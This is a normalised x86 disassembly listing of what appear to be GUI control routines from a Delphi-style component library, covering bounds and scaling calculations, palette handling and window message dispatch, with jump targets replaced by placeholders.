call sub_4044b8
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e712
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
mov al 0x1
sub_44e718
push ebx
mov ebx eax
mov eax ebx
call sub_45bed0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403460
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44e74c
push ebx
mov ebx eax
mov eax ebx
call sub_45bf20
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403460
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_4044b8
je r-xdata
mov al 0x1
pop ebx
retn
sub_44e784
push ebx
mov ebx eax
mov eax ebx
call sub_45bf5c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403460
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44e7b8
push ebx
mov ebx eax
mov eax ebx
call sub_421c60
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44e7e0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44f884
sub_44e800
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_44e820
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_404100
sub_44e844
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_44f774
sub_44e864
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_44e890
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403460
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x158 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403460
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x154 ]
call sub_4044b8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403460
mov al [ edi + 0x70 ]
cmp al [ esi + 0x150 ]
je r-xdata
mov al 0x1
sub_44e8f4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44f1d0
sub_44e914
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44f1bc
sub_44e934
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x150 ] bl
sub_44e954
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_421370
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424220
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_44f904
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44e474
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_4507e0
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x9a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x150 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_44ea2c
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_403664
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_46e2ec
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40364c
push edi
xor ecx ecx
mov edx 0xb039
call sub_450a20
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_44f1f4
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_4034ac
xor eax eax
mov [ edi + 0xa0 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_4032b0
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_4032b0
mov eax [ edi + 0x68 ]
call sub_4032b0
mov eax [ edi + 0x64 ]
call sub_408b54
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4213bc
test bl bl
jle r-xdata
sub_44eaf8
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_44eb20
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd7
call sub_4034ac
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
mov al [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44eba8
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x61 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x61 ] al
mov eax ebx
call sub_44eea8
sub_44ebc8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_4032b0
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45183c
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_4034ac
mov edx ebx
mov eax edi
call sub_421440
mov eax ebx
mov si 0xffd9
call sub_4034ac
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_44ec90
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4217d0
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_450a20
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_450a20
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_450a20
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_450a20
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_450a20
sub_44ed24
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_42168c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_44f80c
jmp r-xdata
xor edx edx
mov eax esi
call sub_44ebc8
sub_44ed68
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov al [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov si 0xffd0
call sub_4034ac
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax edi
call sub_44eba8
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
mov al [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax edi
mov si 0xffee
call sub_4034ac
mov al [ esp ]
test al al
je r-xdata
sub al 0x5
je r-xdata
test bl bl
je r-xdata
sub bl 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_44ee10
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_450fb0
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_44fc9c
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_44eea8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_450a20
mov eax ebx
mov si 0xffd0
call sub_4034ac
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_4034ac
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_44eea8
push ebx
push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x62 ] 0x0
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov bl [ esi + 0x61 ]
mov al [ r-xdata ]
cmp al bl
jne r-xdata
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
adc eax 0x0
mov eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
adc eax 0x0
mov eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x8c ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x2
je r-xdata
mov ebx [ esi + 0x30 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_456358
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x90 ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x4c ]
mov [ esi + 0x94 ] eax
mov edx esp
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ ebx + 0x1fa ]
mov [ esi + 0x90 ] eax
mov eax [ ebx + 0x1fe ]
mov [ esi + 0x94 ] eax
jmp r-xdata
sub_44efc4
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x1
pop esi
pop ebx
retn
sub_44efe8
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x2
pop esi
pop ebx
retn
sub_44f010
push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x4
pop esi
pop ebx
retn
sub_44f034
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x8
pop esi
pop ebx
retn
sub_44f058
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xa0 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_44f153
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_4034ac
test ebx ebx
je r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f15a
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_418b4c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbf
call sub_4034ac
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_4034ac
jmp r-xdata
mov eax [ ebx + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_418854
sub_44f164
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_44fc9c
mov edx edi
mov eax ebx
call sub_44f214
mov edx edi
mov eax ebx
call sub_450ac4
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_44f1d0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x154 ]
mov edx esi
call sub_404100
pop esi
pop ebx
retn
mov [ ebx + 0x150 ] 0x0
sub_44f214
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ edx + 0x8 ]
mov edi [ edx ]
sub eax edi
push eax
mov eax [ edx + 0xc ]
mov ebp [ edx + 0x4 ]
sub eax ebp
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_44f270
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f29c
mov edx eax
mov ecx esp
mov eax esi
call sub_417330
mov edx esp
mov eax ebx
call sub_44f6e0
pop ecx
pop edx
pop esi
pop ebx
retn
sub_44f2b4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f258
mov ecx esp
mov edx esi
call sub_417330
mov edx esp
mov eax ebx
call sub_44f6e0
pop ecx
pop edx
pop esi
pop ebx
retn
sub_44f2dc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44f35d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f364
lea eax [ ebp - 0xc ]
call sub_4040ac
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb18
call sub_403a64
sub_44f36c
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_44f398
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_44f3c4
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_46a840
sub_44f3f4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0xa0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_450a20
sub_44f470
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
mov bl [ r-xdata ]
mov bl [ esi + 0x98 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call MulDiv
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x90 ]
push eax
call MulDiv
mov [ esi + 0x90 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call MulDiv
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call MulDiv
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call MulDiv
mov [ esi + 0x94 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call MulDiv
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_424678
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_424694
sub_44f63c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_44f6d2
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4218c8
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_44f854
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_4044b8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f6d9
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_44f884
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_44f6e0
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_44f728
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
test esi esi
je r-xdata
mov edx ebx
call sub_452ccc
mov edx ebx
mov eax esi
call sub_452bf8
mov eax ebx
call sub_44eea8
sub_44f774
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_4034ac
mov [ edi + 0x57 ] bl
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb00b
mov eax edi
call sub_450a20
mov eax edi
mov si 0xffd0
call sub_4034ac
sub_44f80c
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_463760
mov edx ebx
mov eax esi
call sub_421440
sub_44f830
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_450a20
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_450a20
pop ebx
retn
sub_44f854
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_44f7c8
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_40419c
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_44f7d8
sub_44f884
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44f8d9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44f854
